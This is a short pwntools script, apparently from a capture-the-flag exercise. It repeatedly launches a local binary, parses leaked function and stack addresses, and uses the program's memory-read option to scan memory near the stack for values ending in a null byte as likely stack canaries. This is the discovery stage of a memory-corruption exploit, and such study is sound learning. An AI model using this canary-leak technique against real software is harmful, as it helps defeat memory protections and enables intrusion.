from pwn import *

# Start process multiple times to observe patterns
for i in range(5):
    p = process('./program')
    
    # Get stack leak from program output
    p.recvuntil(b'in ')
    func_addr = int(p.recvuntil(b' ')[:-1], 16)
    p.recvuntil(b'is in ')
    stack_leak = int(p.recvline()[:-1], 16)
    
    print(f"Stack leak: {hex(stack_leak)}")
    
    # Read memory at different offsets from stack_leak
    p.sendline(b'1')  # enter "know more about UwU"
    p.recvuntil(b'address')  # wait for prompt
    
    # Test different offsets
    for offset in range(-0x50, 0x50, 8):  # reasonable range around stack
        addr = stack_leak + offset
        p.sendline(hex(addr).encode())
        try:
            p.recvuntil(b'contains ')
            value = int(p.recvline()[:-2], 16)  # remove \n\n
            
            # Canaries end with null byte
            if value & 0xff == 0:
                print(f"Possible canary at offset {hex(offset)}: {hex(value)}")
        except:
            break
    
    p.close()